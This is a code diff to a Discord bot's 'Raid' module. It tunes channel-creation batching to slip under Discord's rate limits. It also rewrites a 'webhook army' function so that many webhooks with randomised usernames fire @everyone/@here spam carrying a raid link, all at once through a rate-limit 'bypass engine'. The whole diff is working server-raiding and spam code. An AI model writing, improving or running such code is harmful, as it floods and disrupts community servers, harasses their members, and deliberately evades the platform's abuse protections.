@@ -290,8 +290,11 @@ class Raid(commands.Cog):
             if se.is_set():
                 return
 
-            BATCH       = 4
-            BATCH_PAUSE = 1.1   # ~5 channel creates / 5 s guild rate limit
+            # Discord's guild channel-create rate limit is ~2/second.
+            # BATCH=2, BATCH_PAUSE=2.0 keeps us under that limit so every
+            # create lands instead of cascading into 429 exhaustion.
+            BATCH       = 2
+            BATCH_PAUSE = 2.0
 
             async def _create_and_flood(idx: int) -> None:
                 sem1 = asyncio.Semaphore(1)
@@ -393,73 +396,68 @@ class Raid(commands.Cog):
             )
 
     # ── Webhook army ───────────────────────────────────────────────────────────
+    # All webhooks × all messages are built as a single flat coroutine list and
+    # fired with one asyncio.gather — no sequential loops, no drain pauses.
+    # The bypass engine's per-route 429 recovery handles rate limits without
+    # blocking other sends. Result: max Discord throughput from the first second.
     async def _webhook_army(
         self, channel: discord.TextChannel, webhooks_per: int, msgs_per: int, embed_storm: bool
     ) -> None:
-        bp  = bot_state.bypass
-        se  = bot_state.stop_event
-        sem = bp.channel_sem(channel.id, concurrency=8)
-
-        async with sem:
-            wh_results = await asyncio.gather(
-                *[bp.execute(
-                    ROUTE_WEBHOOK_CREATE,
-                    lambda: channel.create_webhook(name=bp.fp.username()),
-                    se,
-                ) for _ in range(webhooks_per)],
-                return_exceptions=True,
-            )
-            webhooks = [w for w in wh_results if isinstance(w, discord.Webhook)]
-
-            if not webhooks:
-                await self._direct_spam(channel, msgs_per)
-                return
-
-            spam_tasks = []
-            for i, wh in enumerate(webhooks):
-                if embed_storm and i % 3 == 0:
-                    spam_tasks.append(self._spam_webhook_embeds(wh, msgs_per))
-                else:
-                    spam_tasks.append(self._spam_webhook_text(wh, msgs_per))
-
-            await asyncio.gather(*spam_tasks, return_exceptions=True)
-            await asyncio.gather(
-                *[bp.execute(ROUTE_WEBHOOK_DELETE, lambda w=wh: w.delete(), se)
-                  for wh in webhooks],
-                return_exceptions=True,
-            )
-
-    async def _spam_webhook_text(self, webhook: discord.Webhook, count: int) -> None:
         bp = bot_state.bypass
-        factories = [
-            lambda wh=webhook: wh.send(
-                bp.fp.message(),
-                username=bp.fp.username(),
-                allowed_mentions=discord.AllowedMentions(everyone=True, roles=True),
-            )
-            for _ in range(count)
-        ]
-        await bp.burst_drain_execute(
-            ROUTE_WEBHOOK_SEND, factories, bot_state.stop_event,
-            drain_every=30, drain_time=0.3,
+        se = bot_state.stop_event
+
+        # Create all webhooks concurrently
+        wh_results = await asyncio.gather(
+            *[bp.execute(
+                ROUTE_WEBHOOK_CREATE,
+                lambda: channel.create_webhook(name=bp.fp.username()),
+                se,
+            ) for _ in range(webhooks_per)],
+            return_exceptions=True,
         )
+        webhooks = [w for w in wh_results if isinstance(w, discord.Webhook)]
 
-    async def _spam_webhook_embeds(self, webhook: discord.Webhook, count: int) -> None:
-        bp = bot_state.bypass
-        for i in range(count):
-            if bot_state.stop_event.is_set():
-                break
-            embed = bp.fp.embed(i)
-            await bp.execute(
-                ROUTE_WEBHOOK_SEND,
-                lambda wh=webhook, em=embed: wh.send(
-                    content=f"@everyone @here {RAID_LINK}",
-                    embed=em,
-                    username=bp.fp.username(),
-                    allowed_mentions=discord.AllowedMentions(everyone=True, roles=True),
-                ),
-                bot_state.stop_event,
-            )
+        if not webhooks:
+            await self._direct_spam(channel, msgs_per)
+            return
+
+        # Flatten ALL sends (all webhooks × all messages) into one gather call.
+        # This fires every message from every webhook simultaneously — the bypass
+        # engine's per-route isolation ensures 429s on one webhook don't pause others.
+        all_sends = []
+        for i, wh in enumerate(webhooks):
+            use_embed = embed_storm and i % 3 == 0
+            for j in range(msgs_per):
+                if se.is_set():
+                    break
+                if use_embed:
+                    embed = bp.fp.embed(j)
+                    all_sends.append(bp.execute(
+                        ROUTE_WEBHOOK_SEND,
+                        lambda wh=wh, em=embed: wh.send(
+                            content=f"@everyone @here {RAID_LINK}",
+                            embed=em,
+                            username=bp.fp.username(),
+                            allowed_mentions=discord.AllowedMentions(
+                                everyone=True, roles=True
+                            ),
+                        ),
+                        se,
+                    ))
+                else:
+                    all_sends.append(bp.execute(
+                        ROUTE_WEBHOOK_SEND,
+                        lambda wh=wh: wh.send(
+                            bp.fp.message(),
+                            username=bp.fp.username(),
+                            allowed_mentions=discord.AllowedMentions(
+                                everyone=True, roles=True
+                            ),
+                        ),
+                        se,
+                    ))
+
+        await asyncio.gather(*all_sends, return_exceptions=True)
 
     # ── Thread flood ───────────────────────────────────────────────────────────
     async def _thread_double_flood(self, channel: discord.TextChannel, count: int) -> None:
